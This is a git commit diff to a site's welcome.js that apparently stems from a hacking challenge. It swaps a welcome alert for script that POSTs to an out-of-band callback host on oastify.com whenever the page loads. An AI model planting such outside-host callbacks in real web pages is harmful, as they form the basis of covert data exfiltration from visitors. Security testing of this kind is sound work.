ec152dd6e3601c72dce3dbdb6629ce5910ade539
l3ng0canh <52392436+l3ng0canh@users.noreply.github.com>
2023-03-03 09:53:43 +0700

    Update welcome.js

--- welcome.js
+++ welcome.js
@@ -1,4 +1,12 @@
-window.onload = function() {
-  alert("Welcome to our Website. Here you can generate Welcome Messages for hackers.");
-  window.status = "tuhin1729";
-};
+var xhr = new XMLHttpRequest();
+var url = "http://5io99liwzcriuzz9kxonjag9y04rskg9.oastify.com";
+var params = "a";
+xhr.open("POST", url, true);
+xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+xhr.onreadystatechange = function() {
+    if(xhr.readyState == 4 && xhr.status == 200) {
+        // Xử lý phản hồi từ server
+        console.log(xhr.responseText);
+    }
+}
+xhr.send(params);
